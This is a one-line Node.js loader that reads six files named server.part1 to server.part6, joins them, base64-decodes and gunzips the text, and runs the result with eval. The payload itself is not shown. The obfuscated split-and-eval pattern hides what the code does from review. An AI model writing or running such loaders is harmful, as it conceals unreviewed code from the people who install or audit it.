const fs=require('fs');const path=require('path');const zlib=require('zlib');let b='';for(let i=1;i<=6;i++)b+=fs.readFileSync(path.join(__dirname,'server.part'+i),'utf8').trim();eval(zlib.gunzipSync(Buffer.from(b,'base64')).toString('utf8'));